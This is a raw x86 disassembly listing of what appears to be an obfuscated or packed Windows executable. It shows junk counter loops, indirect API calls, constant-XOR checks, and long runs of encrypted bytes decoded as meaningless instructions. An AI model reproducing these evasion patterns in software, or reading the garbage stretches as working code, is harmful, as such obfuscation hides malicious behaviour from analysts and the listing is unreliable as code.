  41762e:	mov    eax,ds:0x42a879
  417633:	dec    eax
  417634:	mov    ds:0x42a879,eax
  417639:	mov    eax,ds:0x42a879
  41763e:	dec    eax
  41763f:	mov    ds:0x42a879,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42a80d,0x0
  41765b:	mov    eax,ds:0x42a80d
  417660:	inc    eax
  417661:	mov    ds:0x42a80d,eax
  417666:	cmp    DWORD PTR ds:0x42a80d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42aaf2
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42a80d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	ret    0xf42b
  4176bd:	mov    dl,0x7f
  4176bf:	sub    eax,0x7e05787f
  4176c4:	js     0x41773e
  4176c6:	dec    esi
  4176c7:	or     al,0x76
  4176c9:	mov    edx,0xd0d978af
  4176ce:	xor    eax,esi
  4176d0:	inc    eax
  4176d1:	not    ebp
  4176d3:	aas    
  4176d4:	lds    edi,FWORD PTR [ecx]
  4176d6:	shl    ch,1
  4176d8:	iret   
  4176d9:	clc    
  4176da:	cmp    eax,0xc49bda06
  4176df:	mov    ebp,0x2f15d0e0
  4176e4:	test   al,0xe6
  4176e6:	mov    ah,0x3d
  4176e8:	adc    al,0x9b
  4176ea:	dec    edx
  4176eb:	xor    eax,0x386fe0e3
  4176f0:	(bad)  
  4176f1:	je     0x417732
  4176f3:	push   ebx
  4176f4:	pop    edi
  4176f5:	mov    dh,bh
  4176f7:	inc    ebp
  4176f8:	jle    0xe9db8ebf
  4176fe:	nop
  4176ff:	outs   dx,DWORD PTR ds:[esi]
  417700:	popf   
  417701:	fstp   QWORD PTR [ebx-0x1b]
  417704:	pop    eax
  417705:	test   eax,0x1339cc9e
  41770a:	pop    eax
  41770b:	sbb    al,BYTE PTR [esi+0x20]
  41770e:	inc    ebp
  41770f:	fmulp  st(5),st
  417711:	mov    edi,0xdbbda7bc
  417716:	add    bh,BYTE PTR [edx+0x42]
  417719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41771a:	mov    ds:0x1bbd5cf7,eax
  41771f:	xchg   edi,eax
  417720:	or     al,0x64
  417722:	push   edx
  417724:	dec    edx
  417725:	frstor [edx-0x28caf73a]
  41772b:	(bad)  
  41772c:	cmp    BYTE PTR ds:0xf0300f80,dh
  417732:	leave  
  417733:	and    BYTE PTR [edi-0x8b5bb20],ah
  417739:	popa   
  41773a:	lods   al,BYTE PTR ds:[esi]
  41773b:	shr    DWORD PTR [edi],0x12
  41773e:	mov    esp,edi
  417740:	lods   al,BYTE PTR ds:[esi]
  417741:	dec    edi
  417742:	ja     0x41772c
  417744:	aam    0xc7
  417746:	(bad)  
  417748:	xchg   ebx,eax
  417749:	loop   0x41772d
  41774b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41774c:	call   0x9b64:0x6ad862db
  417753:	mov    al,ds:0x27fd720b
  417758:	inc    BYTE PTR [ebx]
  41775a:	inc    edi
  41775b:	sbb    BYTE PTR [esi+0x15d44cae],al
  417761:	xor    ebx,0x73
  417764:	cli    
  417765:	jmp    0xf057:0xaddc191c
  41776c:	jns    0x4177ba
  41776e:	cmp    BYTE PTR [ebp-0x3f30d237],0xbb
  417775:	scas   al,BYTE PTR es:[edi]
  417776:	out    dx,al
  417777:	xor    eax,0xab173c08
  41777c:	and    cl,ch
  41777e:	mov    dl,0xb8
  417780:	sub    eax,0xe6951bff
  417785:	sub    edi,edi
  417787:	cld    
  417788:	push   ds
  417789:	enter  0x2205,0xa
  41778d:	lods   al,BYTE PTR ds:[esi]
  41778e:	cmp    ch,BYTE PTR [edi+0x5f6c1a39]
  417794:	pusha  
  417795:	enter  0x6d43,0x65
  417799:	xor    al,0x5e
  41779b:	pop    eax
  41779c:	nop
  41779d:	iret   
  41779e:	jp     0x41775f
  4177a0:	or     al,0xb6
  4177a2:	cmp    eax,0xd6cd45af
  4177a7:	pop    ss
  4177a8:	sbb    al,dl
  4177aa:	sub    ch,BYTE PTR [esi-0x33]
  4177ad:	outs   dx,DWORD PTR ds:[esi]
  4177ae:	inc    esi
  4177af:	test   edi,eax
  4177b1:	mov    bh,0xa0
  4177b3:	in     al,dx
  4177b4:	or     eax,0x3924a5a3
  4177b9:	sbb    cl,BYTE PTR [eax-0x16]
  4177bc:	or     esi,DWORD PTR [esi-0x4f]
  4177bf:	sub    DWORD PTR [eax+0x7f],0x5417fadf
  4177c6:	or     eax,0x27c23a3e
  4177cb:	lock pop ebp
  4177cd:	popa   
  4177ce:	or     DWORD PTR [ebp+0x2f],0xb5600fa4
  4177d5:	imul   esp,DWORD PTR [esp+eiz*4-0x15],0xffffffeb
  4177da:	fs jbe 0x4177f3
  4177dd:	stos   DWORD PTR es:[edi],eax
  4177de:	and    DWORD PTR [edx-0x3b],eax
  4177e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177e2:	repz ja 0x417836
  4177e5:	xchg   edi,eax
  4177e6:	mov    ah,0x77
  4177e8:	ss in  eax,0x1
  4177eb:	fisttp WORD PTR [ecx]
  4177ed:	inc    esp
  4177ee:	(bad)
  4177f1:	les    ecx,FWORD PTR [ebp+0x15]
  4177f4:	mov    ch,0x2a
  4177f6:	pop    edi
  4177f7:	dec    esp
  4177f8:	push   es
  4177f9:	arpl   WORD PTR [edi-0x4],bx
  4177fc:	mov    edi,0x66aac7ef
  417801:	inc    esi
  417802:	inc    ebp
  417803:	jno    0x417794
  417805:	das    
  417806:	add    DWORD PTR [ebx+0x4a],ebp
  417809:	pushf  
  41780a:	push   ecx
  41780b:	ret    0x29c9
  41780e:	cmp    DWORD PTR [ebx-0x71],edi
  417811:	scas   al,BYTE PTR es:[edi]
  417812:	sbb    esi,edx
  417814:	data16 jbe 0x417835
  417817:	stos   DWORD PTR es:[edi],eax
  417818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417819:	adc    DWORD PTR [ebx+0xd],esi
  41781c:	inc    edi
  41781d:	iret   
  41781e:	clc    
  41781f:	push   es
  417820:	and    cl,BYTE PTR [ebx+edi*4-0x6978757e]
  417827:	dec    esp
  417828:	enter  0x906f,0xbd
  41782c:	add    esp,ebx
  41782e:	popf   
  41782f:	out    0xd6,eax
  417831:	mov    dl,0xac
  417833:	outs   dx,DWORD PTR fs:[esi]
  417835:	lods   eax,DWORD PTR ds:[esi]
  417836:	mov    fs:0xd64e8a0,eax
  41783c:	enter  0x74ce,0x37
  417840:	mov    esp,0x1108db2f
  417845:	call   FWORD PTR [ecx]
  417847:	cwde   
  417848:	dec    esp
  417849:	pop    esp
  41784a:	mov    eax,0xa045cad8
  41784f:	pop    ecx
  417850:	xchg   ebx,eax
  417851:	or     al,0xa9
  417853:	into   
  417854:	fsub   st(1),st
  417856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417857:	xor    DWORD PTR [edx+0x38],0x528b745
  41785e:	cwde   
  41785f:	lods   eax,DWORD PTR ds:[esi]
  417860:	and    BYTE PTR [ebx+ebx*8-0x65],dh
  417864:	mov    ds:0xfe757ee8,eax
  417869:	xchg   ch,dh
  41786b:	in     eax,0x46
  41786d:	and    bl,bh
  41786f:	xor    DWORD PTR [ebx-0x41],ecx
  417872:	fidivr WORD PTR [ebx-0x1ade808]
  417878:	stos   DWORD PTR es:[edi],eax
  417879:	dec    ebx
  41787a:	jmp    0x417863
  41787c:	out    dx,al
  41787d:	mov    ch,0x60
  41787f:	dec    esi
  417880:	ror    DWORD PTR [ebx-0x754fcc0],0x4d
  417887:	imul   esp,DWORD PTR [edx],0x577cd317
  41788d:	or     al,0xf5
  41788f:	push   edx
  417890:	popf   
  417891:	pop    ds
  417892:	stc    
  417893:	out    dx,eax
  417894:	mov    eax,0xa21bfab5
  417899:	and    edx,0x1d
  41789c:	(bad)  
  41789d:	scas   al,BYTE PTR es:[edi]
  41789e:	call   0x3275:0xe657661b
  4178a5:	mov    bh,0xe4
  4178a7:	out    0xf2,al
  4178a9:	stos   BYTE PTR es:[edi],al
  4178aa:	jl     0x4178ba
  4178ac:	inc    edx
  4178ad:	and    esp,eax
  4178af:	pop    eax
  4178b0:	pusha  
  4178b1:	int    0xa7
  4178b3:	int3   
  4178b4:	loop   0x4178b4
  4178b6:	repz dec ebx
  4178b8:	mov    bh,0xb2
  4178ba:	jp     0x417878
  4178bc:	mov    bh,0x7e
  4178be:	sub    al,0x14
  4178c0:	test   DWORD PTR [ebx],eax
  4178c2:	lods   al,BYTE PTR ds:[esi]
  4178c3:	stos   DWORD PTR es:[edi],eax
  4178c4:	lock std 
  4178c6:	mov    edi,0x3cd00bea
  4178cb:	bound  ebx,QWORD PTR [ebx-0x5f6db04b]
  4178d1:	add    ecx,DWORD PTR [eax+0x3c]
  4178d4:	jmp    0x417afc
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	repnz dec esi
  4178e7:	mov    WORD PTR [edi+0x787f3304],es
  4178ed:	add    eax,0x3c78787e
  4178f2:	mov    ecx,0x9f2577bf
  4178f7:	pop    ss
  4178f8:	cld    
  4178f9:	jno    0x417902
  4178fb:	ins    DWORD PTR es:[edi],dx
  4178fc:	in     al,dx
  4178fd:	in     al,0xc3
  4178ff:	jp     0x4178dd
  417901:	popa   
  417902:	enter  0x6c56,0x7c
  417906:	mov    edx,edx
  417908:	dec    edi
  417909:	stc    
  41790a:	mov    al,0x74
  41790c:	iret   
  41790d:	mov    bh,0xee
  41790f:	sub    DWORD PTR [edx-0x277593b7],ebp
  417915:	lods   al,BYTE PTR ds:[esi]
  417916:	cmc    
  417917:	jp     0x4178fd
  417919:	(bad)  
  41791a:	add    eax,DWORD PTR gs:[edx-0x3a]
  41791e:	pusha  
  41791f:	outs   dx,DWORD PTR ds:[esi]
  417920:	mov    ch,0x6a
  417922:	mov    cl,0xbe
  417924:	ror    DWORD PTR [ecx-0x33],0x95
  417928:	jno    0x4178be
  41792a:	das    
  41792b:	mov    ah,0xa2
  41792d:	cmp    edx,DWORD PTR [ecx+eax*4-0x2cd83d69]
  417934:	mov    bh,0x14
  417936:	sbb    DWORD PTR [edx+0x6f],esp
  417939:	jo     0x417976
  41793b:	dec    edx
  41793c:	repz aam 0x69
  41793f:	xchg   esp,eax
  417940:	scas   eax,DWORD PTR es:[edi]
  417941:	fimul  DWORD PTR ds:0xc560413c
  417947:	lea    esp,[edx-0xc14152d]
  41794d:	pop    ebx
  41794e:	das    
  41794f:	fucomip st,st(7)
  417951:	add    BYTE PTR [esp+ebx*4+0x11],cl
  417955:	jno    0x4178da
  417957:	fidiv  DWORD PTR [ebp+0x6e]
  41795a:	cmp    ch,BYTE PTR [ebx-0x38b38ce5]
  417960:	and    al,0x63
  417962:	and    eax,0x3b2bfe8e
  417967:	(bad)
  41796c:	push   edi
  41796d:	pop    ebp
  41796e:	bound  edx,QWORD PTR [ecx]
  417970:	orps   xmm3,XMMWORD PTR [esi-0x2b]
  417974:	push   edx
  417975:	clc    
  417976:	or     al,0x60
  417978:	cmp    DWORD PTR [ebp-0x49ef074a],esi
  41797e:	fwait
  41797f:	jmp    0xde37e77b
  417984:	dec    esp
  417985:	mov    edi,0x91460a
  41798a:	sub    edi,ebx
  41798c:	mov    eax,ds:0x79bc6acd
  417991:	jne    0x417938
  417993:	xor    al,BYTE PTR [ebp+0x21]
  417996:	div    BYTE PTR [edi-0x78]
  417999:	iret   
  41799a:	fst    st(1)
  41799c:	leave  
  41799d:	push   0xffffffae
  41799f:	mov    edx,0x8d9a8cb0
  4179a4:	mov    es:0xcd19187d,eax
  4179aa:	retf   
  4179ab:	push   ds
  4179ac:	mov    ds:0xb5bfff6,eax
  4179b1:	dec    edx
  4179b2:	adc    eax,0x4b6effd3
  4179b7:	int3   
  4179b8:	and    DWORD PTR [ecx+edx*4+0x26],edx
  4179bc:	mul    BYTE PTR [esi-0x53]
  4179bf:	or     edx,edx
  4179c1:	(bad)  
  4179c2:	and    BYTE PTR fs:[esi+0xb],ch
  4179c6:	test   BYTE PTR [ebp-0x1578d7df],bl
  4179cc:	test   eax,0xf663728b
  4179d1:	popf   
  4179d2:	sti    
  4179d3:	clc    
  4179d4:	lds    ebp,FWORD PTR [edx+0x25]
  4179d7:	add    DWORD PTR [ebx],esi
  4179d9:	jecxz  0x417a49
  4179db:	mov    ecx,0xcf456639
  4179e0:	mov    al,ds:0x22b7ae56
  4179e5:	jmp    0x1761:0xd41f91af
  4179ec:	sub    DWORD PTR [ebx+edx*8-0x80],ebp
  4179f0:	sti    
  4179f1:	sbb    dh,BYTE PTR [eax]
  4179f3:	or     eax,0xf24405a7
  4179f8:	pusha  
  4179f9:	dec    ebx
  4179fa:	cmp    eax,0x22190d10
  4179ff:	jp     0x417999
  417a01:	or     bl,BYTE PTR [ecx]
  417a03:	mov    bh,ah
  417a05:	lahf   
  417a06:	popa   
  417a07:	mov    BYTE PTR [esp+ebp*2+0x3a5273a0],al
  417a0e:	mov    bl,0x12
  417a10:	sbb    eax,0x88e6a060
  417a15:	(bad)  
  417a16:	xor    BYTE PTR [edi],cl
  417a18:	and    ecx,esi
  417a1a:	add    eax,0xaead2fdf
  417a1f:	lock shl eax,cl
  417a22:	mov    ebx,0x825e139f
  417a27:	jnp    0x417a45
  417a29:	push   0x7d
  417a2b:	sti    
  417a2c:	sar    DWORD PTR [edi-0x2f],1
  417a2f:	cmp    DWORD PTR [esp+esi*2],0x4a
  417a33:	inc    eax
  417a34:	jae    0x4179d1
  417a36:	xchg   DWORD PTR [ecx],ecx
  417a38:	mov    edx,0xe003ff82
  417a3d:	sar    BYTE PTR [ecx],0x69
  417a40:	add    BYTE PTR [ebp+0x3275e896],al
  417a46:	xchg   edx,eax
  417a47:	cmp    DWORD PTR [esi],0x76fef221
  417a4d:	in     al,dx
  417a4e:	dec    ecx
  417a4f:	cmp    eax,0x4f0834bc
  417a54:	sbb    bl,BYTE PTR [edi]
  417a56:	jmp    0x258b:0xcc314619
  417a5d:	and    al,0x3a
  417a5f:	sar    DWORD PTR [esp+esi*4+0x24],cl
  417a63:	xor    al,0x82
  417a65:	xchg   esp,eax
  417a66:	dec    ebp
  417a67:	call   0xc6b6:0x782f40a2
  417a6e:	test   al,0xab
  417a70:	sbb    BYTE PTR [ebx],cl
  417a72:	xchg   ecx,eax
  417a73:	and    ebp,edx
  417a75:	retf   0x74da
  417a78:	lods   al,BYTE PTR ds:[esi]
  417a79:	inc    ebp
  417a7a:	lahf   
  417a7b:	loope  0x417af3
  417a7d:	outs   dx,BYTE PTR ds:[esi]
  417a7e:	jmp    0xdb5f:0x4d0a009e
  417a85:	ss push 0x16d9883a
  417a8b:	sbb    al,0xd
  417a8d:	shl    BYTE PTR [ebp+0x4a],0xd4
  417a91:	or     BYTE PTR [ebx+0x7b73a9d0],bl
  417a97:	sub    al,0x77
  417a99:	cmc    
  417a9a:	into   
  417a9b:	pop    es
  417a9c:	add    BYTE PTR [edi+0xf],bh
  417a9f:	stos   BYTE PTR es:[edi],al
  417aa0:	add    ebp,DWORD PTR [ebx+0x71bc9537]
  417aa6:	mov    dl,0xc7
  417aa8:	mov    dh,0xaf
  417aaa:	repz icebp 
  417aac:	call   0x2043:0x59408459
  417ab3:	aad    0xf
  417ab5:	or     al,0x8
  417ab7:	iret   
  417ab8:	jmp    FWORD PTR [esi+0x5b0cd8ec]
  417abe:	jmp    0x417afa
  417ac0:	pop    eax
  417ac1:	(bad)  
  417ac2:	retf   0x810f
  417ac5:	test   DWORD PTR [esp+eiz*2-0x37],ecx
  417ac9:	xchg   ecx,eax
  417aca:	shl    BYTE PTR [ecx-0x5f],0x88
  417ace:	ss xchg ebx,eax
  417ad0:	mov    ah,0x47
  417ad2:	cwde   
  417ad3:	out    0x75,al
  417ad5:	sbb    BYTE PTR [ecx],bh
  417ad7:	jnp    0x417b2b
  417ad9:	sbb    ch,bh
  417adb:	fsubr  QWORD PTR [ebx]
  417add:	pop    es
  417ade:	ret    
  417adf:	inc    esp
  417ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ae1:	cld    
  417ae2:	jmp    0x144ffd51
  417ae7:	sbb    eax,0xd84bb05f
  417aec:	push   ecx
  417aed:	idiv   DWORD PTR [ebp+0xc]
  417af0:	xchg   esp,eax
  417af1:	adc    BYTE PTR [ebx+0x7f],al
  417af4:	jno    0x417b14
  417af6:	icebp  
  417af7:	cmp    edx,DWORD PTR [edx-0x456c0a2c]
  417afd:	push   eax
  417afe:	or     BYTE PTR [ecx+0x7],dl
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0xacd3906c
  417b49:	and    eax,0x787f3111
  417b4e:	add    eax,0xb878787e
  417b53:	sti    
  417b54:	test   al,0xd5
  417b56:	loop   0x417bbf
  417b58:	dec    ecx
  417b59:	mov    ah,0x30
  417b5b:	inc    ecx
  417b5c:	in     al,dx
  417b5d:	test   ch,ch
  417b5f:	cmp    eax,0xfaa79be5
  417b64:	int3   
  417b65:	adc    bh,dl
  417b67:	mov    BYTE PTR [eax+0x30432d25],dh
  417b6d:	icebp  
  417b6e:	push   edi
  417b6f:	frstor [ebp-0x50]
  417b72:	out    0x4,eax
  417b74:	retf   
  417b75:	pop    edx
  417b76:	push   ds
  417b77:	add    eax,0x6af719fb
  417b7c:	or     al,0x8a
  417b7e:	ja     0x417b45
  417b80:	arpl   WORD PTR [ecx+ebp*1-0x1a],dx
  417b84:	scas   eax,DWORD PTR es:[edi]
  417b85:	pop    edi
  417b86:	pop    ecx
  417b87:	aas    
  417b88:	jge    0x417b3c
  417b8a:	jo     0x417bc5
  417b8c:	adc    DWORD PTR [ecx+ecx*8],ebp
  417b8f:	jmp    0xe771:0xa97a693b
  417b96:	out    dx,al
  417b97:	and    BYTE PTR [esi],al
  417b99:	or     DWORD PTR [ebx+eax*1],0xafbc00e
  417ba0:	or     DWORD PTR ds:0x8c07a53f,edx
  417ba6:	sbb    bh,al
  417ba8:	cmp    BYTE PTR [edi],0xd0
  417bab:	xchg   edi,eax
  417bac:	rcl    bh,1
  417bae:	mov    ebx,0x64a2174c
  417bb3:	pusha  
  417bb4:	sbb    BYTE PTR [edi+0x61],dh
  417bb7:	gs jle 0x417ba7
  417bba:	icebp  
  417bbb:	out    dx,eax
  417bbc:	int    0x6d
  417bbe:	add    BYTE PTR [edx+0x56b3501b],dh
  417bc4:	in     eax,dx
  417bc5:	mov    ebp,0xa1f76de4
  417bca:	sub    DWORD PTR [ecx],eax
  417bcc:	repz mov al,0x71
  417bcf:	mov    dh,0x8
  417bd1:	movaps xmm2,XMMWORD PTR [ecx]
  417bd4:	inc    esi
  417bd5:	jge    0x417b65
  417bd7:	aaa    
  417bd8:	mov    esp,0xcd13f763
  417bdd:	cmp    DWORD PTR [esi+0x47ffd5e],edi
  417be3:	push   edi
  417be4:	add    bl,BYTE PTR [eax]
  417be6:	leave  
  417be7:	dec    ebp
  417be8:	aad    0xa7
  417bea:	stos   BYTE PTR es:[edi],al
  417beb:	mov    edx,0xf069970b
  417bf0:	jle    0x417b81
  417bf2:	addr16 xchg edx,ecx
  417bf5:	or     ecx,edi
  417bf7:	pop    ebp
  417bf8:	in     al,0xe2
  417bfa:	enter  0xbf9c,0x6f
  417bfe:	or     DWORD PTR [eax+0x76],0xffffff86
  417c02:	lock inc eax
  417c04:	push   0x55
  417c06:	in     eax,dx
  417c07:	ins    DWORD PTR es:[edi],dx
  417c08:	aam    0x76
  417c0a:	mov    ah,BYTE PTR [ecx+0x34b82a49]
  417c10:	xadd   DWORD PTR [ecx+edi*8-0x6f],esp
  417c15:	leave  
  417c16:	mov    bl,0xde
  417c18:	mov    eax,DWORD PTR [ebx]
  417c1a:	jne    0x417c06
  417c1c:	test   al,0x3e
  417c1e:	popa   
  417c1f:	cdq    
  417c20:	jg     0x417c03
  417c22:	repz into 
  417c24:	mov    ah,0xd6
  417c26:	push   es
  417c27:	push   es
  417c28:	ret    0x249e
  417c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c2c:	js     0x417bea
  417c2e:	adc    BYTE PTR [eax-0x5a],dl
  417c31:	arpl   WORD PTR [edx+0x25],si
  417c34:	dec    ebx
  417c35:	mov    dh,0xd9
  417c37:	inc    edx
  417c38:	aad    0x9c
  417c3a:	or     al,0xb9
  417c3c:	stos   DWORD PTR es:[edi],eax
  417c3d:	cdq    
  417c3e:	push   cs
  417c3f:	jae    0x417ca7
  417c41:	ins    DWORD PTR es:[edi],dx
  417c42:	outs   dx,DWORD PTR ds:[esi]
  417c43:	add    al,0x10
  417c45:	pop    es
  417c46:	cwde   
  417c47:	cmp    ebp,DWORD PTR [ecx+0x27]
  417c4a:	(bad)  
  417c4b:	dec    edi
  417c4c:	out    0xee,eax
  417c4e:	dec    ebx
  417c4f:	sbb    al,0x4a
  417c51:	popa   
  417c52:	jp     0x417cbd
  417c54:	inc    esi
  417c55:	dec    ecx
  417c56:	push   ebx
  417c57:	js     0x417bdd
  417c59:	adc    bh,BYTE PTR [edi+0x7f0c8465]
  417c5f:	mov    dh,0xd5
  417c61:	mov    edx,0x9ea477ae
  417c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c67:	xlat   BYTE PTR ds:[ebx]
  417c68:	mov    WORD PTR [ebp+0x680c8ceb],fs
  417c6e:	add    eax,0x627fb701
  417c73:	push   0xffffff86
  417c75:	adc    al,0xf6
  417c77:	pop    ebx
  417c78:	mov    edi,0x5192422
  417c7d:	(bad)  
  417c7f:	aaa    
  417c80:	xor    dl,dl
  417c82:	lea    esp,[ecx]
  417c84:	xchg   esi,eax
  417c85:	pop    ebx
  417c86:	inc    eax
  417c87:	pusha  
  417c88:	cld    
  417c89:	daa    
  417c8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c8b:	mov    cl,al
  417c8d:	cmp    dl,BYTE PTR [edx+0x3d]
  417c90:	daa    
  417c91:	jmp    0xe69404e9
  417c96:	fisttp DWORD PTR [esi+esi*8-0x36117b81]
  417c9d:	and    al,0x1f
  417c9f:	(bad)  
  417ca0:	es dec esi
  417ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ca3:	inc    eax
  417ca4:	mov    esi,0x96cbb799
  417ca9:	call   0x7474934e
  417cae:	retf   0xab72
  417cb1:	push   edi
  417cb2:	sar    eax,0xcc
  417cb5:	mov    ebx,0x25452114
  417cba:	mov    ebp,0x8ad98cad
  417cbf:	ret    0x6231
  417cc2:	jnp    0x417d18
  417cc4:	mov    WORD PTR [ebx-0x4],?
  417cc7:	lock jmp 0xb448:0x57b03a81
  417ccf:	push   esi
  417cd0:	xor    eax,0x4bccc49c
  417cd5:	mov    ch,0x6f
  417cd7:	push   esi
  417cd8:	imul   ebp,DWORD PTR [edx],0xffffffe6
  417cdb:	ret    0xb5b8
  417cde:	jmp    0x417c90
  417ce0:	push   edi
  417ce1:	add    ah,BYTE PTR ds:0x244ab935
  417ce7:	dec    ebx
  417ce8:	jge    0x417cf4
  417cea:	mov    al,0xf4
  417cec:	pusha  
  417ced:	jae    0x417d18
  417cef:	mov    eax,ds:0x8963d7c2
  417cf4:	mov    fs,WORD PTR [edi+0x2]
  417cf7:	dec    edi
  417cf8:	inc    ebx
  417cf9:	loop   0x417d59
  417cfb:	shl    BYTE PTR [ebx+0x0],1
  417cfe:	pop    es
  417cff:	dec    ecx
  417d00:	xor    al,0x99
  417d02:	test   eax,0x3449448d
  417d08:	and    BYTE PTR [edx+0x43],al
  417d0b:	aad    0xf8
  417d0d:	adc    eax,0x83999960
  417d12:	xchg   ebx,eax
  417d13:	dec    esp
  417d14:	lea    esi,[eax+0x5c22cad9]
  417d1a:	(bad)  
  417d1b:	cmp    eax,0xd1c4ff51
  417d20:	jb     0x417d8c
  417d22:	out    0xd0,eax
  417d24:	dec    edi
  417d25:	mov    esi,0xdea7f992
  417d2a:	es add al,0x7
  417d2d:	mul    edi
  417d2f:	mov    esi,0x6fd1cf0e
  417d34:	mov    WORD PTR ds:0x7c8f749f,?
  417d3a:	mov    edx,0x4b622699
  417d3f:	scas   eax,DWORD PTR es:[edi]
  417d40:	test   DWORD PTR [eax],ebp
  417d42:	jmp    0xddb4:0xf13fcb12
  417d49:	out    dx,al
  417d4a:	lea    ebp,[esi]
  417d4c:	cwde   
  417d4d:	lahf   
  417d4e:	and    al,0x89
  417d50:	outs   dx,DWORD PTR ds:[esi]
  417d51:	adc    al,0x40
  417d53:	in     al,0xb7
  417d55:	pop    esp
  417d56:	jmp    0x90bf1103
  417d5b:	jae    0x417cfa
  417d5d:	xor    eax,0x7510850
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42a801,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42a801
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42a801,ecx
  417d8b:	cmp    DWORD PTR ds:0x42a801,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42a801,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42a805
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a77d
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42a83d,0x42a831
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42a835,0x42a889
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a775,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42a835,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42a80d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a759,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42a7f1,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42a7f1
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42a7f1,esi
  417e51:	cmp    DWORD PTR ds:0x42a7f1,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42a7f1,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	push   esi
  417e8e:	(bad)  
  417e8f:	and    ebx,DWORD PTR ds:0x7f37
  417e94:	js     0x417f11
  417e96:	jle    0x417f10
  417e98:	js     0x417e24
  417e9a:	cmp    edi,ebx
  417e9c:	lea    ecx,[ebx+eiz*1-0x4]
  417ea0:	or     ebx,DWORD PTR [edx-0x67d5c8e0]
  417ea6:	fsub   st(3),st
  417ea8:	(bad)  
  417eaa:	mov    ch,0x9b
  417eac:	push   cs
  417ead:	ret    0x3784
  417eb0:	outs   dx,DWORD PTR ds:[esi]
  417eb1:	xchg   esi,eax
  417eb2:	sbb    ebp,DWORD PTR [bp-0x50f8]
  417eb7:	ins    BYTE PTR es:[edi],dx
  417eb8:	pusha  
  417eb9:	outs   dx,DWORD PTR ds:[esi]
